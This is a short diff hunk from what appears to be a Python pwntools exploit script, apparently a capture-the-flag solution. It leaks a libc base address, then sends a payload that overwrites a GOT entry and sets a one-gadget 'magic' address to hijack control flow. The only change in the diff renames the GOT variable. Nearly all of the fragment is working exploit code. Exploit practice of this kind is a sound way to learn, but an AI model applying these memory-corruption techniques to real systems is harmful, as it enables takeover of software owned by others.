@@ -62,10 +62,10 @@ r.recvuntil("Bye, ")
 #libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x3c3b78
 libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x3be7b8
 print "libc:",hex(libc)
-strcmp_got = 0x000000000603060
+got = 0x000000000603060
 
 signin("fsean")
-pubmsg("c"*0x30 + p64(strcmp_got))
+pubmsg("c"*0x30 + p64(got))
 ret = 0x00000000004007b9
 magic = libc + 0xe5765
 #magic = libc + 0x4525a
